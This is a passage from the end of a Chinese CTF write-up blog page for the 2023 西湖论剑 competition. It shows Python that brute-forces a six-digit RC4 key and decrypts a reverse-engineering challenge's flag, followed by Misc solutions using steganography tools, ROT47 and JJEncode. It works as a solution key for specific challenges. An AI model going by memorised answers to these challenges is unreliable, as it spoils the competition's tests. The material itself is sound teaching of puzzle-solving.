style="color:#ae81ff">0xCF</span>, <span style="color:#ae81ff">0xF8</span>, <span style="color:#ae81ff">0x6A</span>, <span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0x25</span>, <span style="color:#ae81ff">0xE4</span>, <span style="color:#ae81ff">0xB7</span>, <span style="color:#ae81ff">0xB9</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0xFB</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">0xA0</span>, <span style="color:#ae81ff">0xF0</span>, <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0xAB</span>, <span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0xC6</span>, <span style="color:#ae81ff">0xC7</span>, <span style="color:#ae81ff">0x46</span>, <span style="color:#ae81ff">0x99</span>, <span style="color:#ae81ff">0xBD</span>, <span style="color:#ae81ff">0x1E</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x5E</span>, <span style="color:#ae81ff">0xEE</span>, <span style="color:#ae81ff">0x55</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0xEE</span>, <span style="color:#ae81ff">0x03</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0x84</span>, <span style="color:#ae81ff">0x7F</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0x5F</span>, <span style="color:#ae81ff">0xB4</span>, <span style="color:#ae81ff">0x6A</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0xD8</span>, <span style="color:#ae81ff">0x6C</span>, <span style="color:#ae81ff">0xE4</span>, <span style="color:#ae81ff">0xC0</span>, <span style="color:#ae81ff">0x9D</span>, <span style="color:#ae81ff">0x6B</span>, <span style="color:#ae81ff">0xCC</span>, <span style="color:#ae81ff">0xD5</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0x5C</span>, <span style="color:#ae81ff">0xDD</span>, <span style="color:#ae81ff">0xCC</span>, <span style="color:#ae81ff">0xD5</span>, <span style="color:#ae81ff">0x3D</span>, <span style="color:#ae81ff">0xC0</span>, <span style="color:#ae81ff">0xEF</span>, <span style="color:#ae81ff">0x0C</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0xE5</span>, <span style="color:#ae81ff">0xB0</span>, <span style="color:#ae81ff">0x93</span>, <span style="color:#ae81ff">0xF1</span>, <span style="color:#ae81ff">0xB3</span>, <span style="color:#ae81ff">0xDE</span>, <span style="color:#ae81ff">0xB0</span>, <span style="color:#ae81ff">0x70</span>]
</span></span><span style="display:flex;"><span>mid<span style="color:#f92672">=</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">16</span><span style="color:#f92672">+</span>[<span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x37</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x37</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x37</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x34</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 枚举6位十进制的key</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> j1 <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x30</span>,<span style="color:#ae81ff">0x3a</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> j2 <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x30</span>,<span style="color:#ae81ff">0x3a</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j3 <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x30</span>,<span style="color:#ae81ff">0x3a</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> j4 <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x30</span>,<span style="color:#ae81ff">0x3a</span>):
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> j5 <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x30</span>,<span style="color:#ae81ff">0x3a</span>):
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">for</span> j6 <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x30</span>,<span style="color:#ae81ff">0x3a</span>):
</span></span><span style="display:flex;"><span>                        key<span style="color:#f92672">=</span>[j1,j2,j3,j4,j5,j6]
</span></span><span style="display:flex;"><span>                        v6<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>                            s[i]<span style="color:#f92672">=</span>i
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>                            v6<span style="color:#f92672">=</span>(v6<span style="color:#f92672">+</span>key[i<span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>]<span style="color:#f92672">+</span>s[i])<span style="color:#f92672">%</span><span style="color:#ae81ff">256</span>
</span></span><span style="display:flex;"><span>                            s[i],s[v6]<span style="color:#f92672">=</span>s[v6],s[i]
</span></span><span style="display:flex;"><span>                        flag<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>                        v7,v6<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">112</span>):
</span></span><span style="display:flex;"><span>                            v7<span style="color:#f92672">=</span>(v7<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">%</span><span style="color:#ae81ff">256</span>
</span></span><span style="display:flex;"><span>                            v6<span style="color:#f92672">=</span>(v6<span style="color:#f92672">+</span>s[v7])<span style="color:#f92672">%</span><span style="color:#ae81ff">256</span>
</span></span><span style="display:flex;"><span>                            s[v7],s[v6]<span style="color:#f92672">=</span>s[v6],s[v7]
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">if</span> i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">16</span>:
</span></span><span style="display:flex;"><span>                                <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">if</span> cipher[i]<span style="color:#f92672">^</span>s[(s[v6]<span style="color:#f92672">+</span>s[v7])<span style="color:#f92672">%</span><span style="color:#ae81ff">256</span>]<span style="color:#f92672">!=</span>mid[i]:
</span></span><span style="display:flex;"><span>                                flag<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>                                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> flag<span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>                            print(j1,j2,j3,j4,j5,j6)
</span></span><span style="display:flex;"><span>                            exit(<span style="color:#ae81ff">0</span>)
</span></span></code></pre></div><p>得到密钥[56,48,55,51,57,49]，再进行常规的解密即可</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">base83decode</span>(num):
</span></span><span style="display:flex;"><span>    bina<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> num:
</span></span><span style="display:flex;"><span>        bina<span style="color:#f92672">+=</span>bin(int(chr(i)))[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">3</span>,<span style="color:#e6db74">&#39;0&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> [int(bina[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>],<span style="color:#ae81ff">2</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,len(bina),<span style="color:#ae81ff">8</span>)]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key<span style="color:#f92672">=</span>[<span style="color:#ae81ff">56</span>,<span style="color:#ae81ff">48</span>,<span style="color:#ae81ff">55</span>,<span style="color:#ae81ff">51</span>,<span style="color:#ae81ff">57</span>,<span style="color:#ae81ff">49</span>]
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>    s[i]<span style="color:#f92672">=</span>i
</span></span><span style="display:flex;"><span>v6<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>    v6<span style="color:#f92672">=</span>(v6<span style="color:#f92672">+</span>key[i<span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>]<span style="color:#f92672">+</span>s[i])<span style="color:#f92672">%</span><span style="color:#ae81ff">256</span>
</span></span><span style="display:flex;"><span>    s[i],s[v6]<span style="color:#f92672">=</span>s[v6],s[i]
</span></span><span style="display:flex;"><span>v7,v6<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">112</span>):
</span></span><span style="display:flex;"><span>    v7<span style="color:#f92672">=</span>(v7<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">%</span><span style="color:#ae81ff">256</span>
</span></span><span style="display:flex;"><span>    v6<span style="color:#f92672">=</span>(v6<span style="color:#f92672">+</span>s[v7])<span style="color:#f92672">%</span><span style="color:#ae81ff">256</span>
</span></span><span style="display:flex;"><span>    s[v7],s[v6]<span style="color:#f92672">=</span>s[v6],s[v7]
</span></span><span style="display:flex;"><span>    cipher[i]<span style="color:#f92672">^=</span>s[(s[v6]<span style="color:#f92672">+</span>s[v7])<span style="color:#f92672">%</span><span style="color:#ae81ff">256</span>]
</span></span><span style="display:flex;"><span>txt<span style="color:#f92672">=</span>base83decode(cipher)
</span></span><span style="display:flex;"><span>print(bytes(txt<span style="color:#f92672">+</span>key))
</span></span></code></pre></div><h2 id="misc">Misc</h2>
<h3 id="签到">签到</h3>
<p>使用HexEditor查看图片发现尾部有汉字编码，向公众号发送“西湖论剑2023我来了！”得到flag。</p>
<h3 id="mp3">mp3</h3>
<p>HexEditor查看MP3文件发现png格式头89504E47。
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 257; 
			flex-basis: 618px"
	>
	<a href="/post/xhlj-writeup-by-or4nge/img/misc1.png" data-size="900x349">
		<img src="/post/xhlj-writeup-by-or4nge/img/misc1.png"
			width="900"
			height="349"
			srcset="/post/xhlj-writeup-by-or4nge/img/misc1_hu4936dc5096ff4fe597a87db21fcdf1f0_76760_480x0_resize_box_3.png 480w, /post/xhlj-writeup-by-or4nge/img/misc1_hu4936dc5096ff4fe597a87db21fcdf1f0_76760_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
提取图片，Stegsolve查看lsb隐写，发现任意勾选三通道之一可以解出一个zip压缩包。
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 143; 
			flex-basis: 343px"
	>
	<a href="/post/xhlj-writeup-by-or4nge/img/misc2.png" data-size="1077x753">
		<img src="/post/xhlj-writeup-by-or4nge/img/misc2.png"
			width="1077"
			height="753"
			srcset="/post/xhlj-writeup-by-or4nge/img/misc2_hu6952adcc65d66d0b3ac66f5a47d0b686_56024_480x0_resize_box_3.png 480w, /post/xhlj-writeup-by-or4nge/img/misc2_hu6952adcc65d66d0b3ac66f5a47d0b686_56024_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
提取压缩包数据发现已被加密，mp3stego查看mp3文件中是否含有隐写，这里存在非预期：输入任意passphrase都可以分离出包含压缩包口令的txt文件，最终得到压缩包口令8750d5109208213f。
解压得到47.txt，猜测内容经过了ROT47处理，还原得到一串JJEncode混淆编码，输入chrome控制台拿到flag。</p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/writeup/">Writeup</a>
        
            <a href="/tags/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">西湖论剑</a>
        
            <a href="/tags/web/">Web</a>
        
    </section>


    </footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css"integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn"crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js"integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8"crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js"integrity="sha384-vZTG03m&#43;2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"crossorigin="anonymous"
                defer="true"
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
        renderMathInElement(document.querySelector(`.article-content`), {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ]
        });})
</script>
    
</article>

    <aside class="related-contents--wrapper">
    
    
        <h2 class="section-title">Related contents</h2>
        <div class="related-contents">
            <div class="flex article-list--tile">
                
                    
<article class="">
    <a href="/post/wdb2022-writeup-by-or4nge/">
        
        

        <div class="article-details">
            <h2 class="article-title">2022网鼎杯初赛 Writeup by or4nge</h2>
        </div>
    </a>
</article>
                
                    
<article class="">
    <a href="/post/hgame2022-writeup-by-or4nge/">
        
        

        <div class="article-details">
            <h2 class="article-title">HGAME2022 Writeup by or4nge</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/post/cazy-writeup-by-or4nge/">
        
        
            <div class="article-image">
                <img src="/post/cazy-writeup-by-or4nge/cover.b7dbd864c0b986f185463e4e1e361913_hu2ef483a7301ed58558e75f3e1747bee2_206467_250x150_fill_box_smart1_3.png" 
                        width="250" 
                        height="150" 
                        loading="lazy" 
                        data-key="" 
                        data-hash="md5-t9vYZMC5hvGFRj5OHjYZEw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">长安战“疫” Writeup</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/post/dnuictf-writeup-by-or4nge/">
        
        
            <div class="article-image">
                <img src="/post/dnuictf-writeup-by-or4nge/Top%2010%20Teams.a2ec5f685d98dbff218d75d526fbc61d_hu9bd851d71a6520395d404c81ac536fbe_87588_250x150_fill_box_smart1_3.png" 
                        width="250" 
                        height="150" 
                        loading="lazy" 
                        data-key="" 
                        data-hash="md5-ouxfaF2Y2/8hjXXVJvvGHQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">2021暗泉杯 Writeup</h2>
        </div>
    </a>
</article>
                
                    
<article class="">
    <a href="/post/qwnt-writeup-by-or4nge/">
        
        

        <div class="article-details">
            <h2 class="article-title">“强网”拟态 Writeup by or4nge</h2>
        </div>
    </a>
</article>
                
            </div>
        </div>
    
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2023 or4nge
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer="true"
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
            >

            </main>
    
        <aside class="sidebar right-sidebar sticky">
            <section class="widget archives">
                <div class="widget-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



                </div>
                <h2 class="widget-title section-title">Table of contents</h2>
                
                <div class="widget--toc">
                    <nav id="TableOfContents">
  <ul>
    <li><a href="#web">Web</a>
      <ul>
        <li><a href="#扭转乾坤">扭转乾坤</a></li>
        <li><a href="#real_ez_node">real_ez_node</a></li>
        <li><a href="#real-world-git">real world git</a></li>
        <li><a href="#unusual-php">unusual php</a></li>
        <li><a href="#node-magical-login">Node Magical Login</a></li>
        <li><a href="#easy_api">easy_api(*)</a></li>
      </ul>
    </li>
    <li><a href="#pwn">Pwn</a>
      <ul>
        <li><a href="#babycalc">babycalc</a></li>
        <li><a href="#message-board">Message Board</a></li>
      </ul>
    </li>
    <li><a href="#reverse">Reverse</a>
      <ul>
        <li><a href="#dual-personality">Dual personality</a></li>
        <li><a href="#berkeley">Berkeley</a></li>
        <li><a href="#babyre">BabyRE</a></li>
      </ul>
    </li>
    <li><a href="#misc">Misc</a>
      <ul>
        <li><a href="#签到">签到</a></li>
        <li><a href="#mp3">mp3</a></li>
      </ul>
    </li>
  </ul>
</nav>
                </div>
            </section>
        </aside>
    

        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
                defer="false"
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
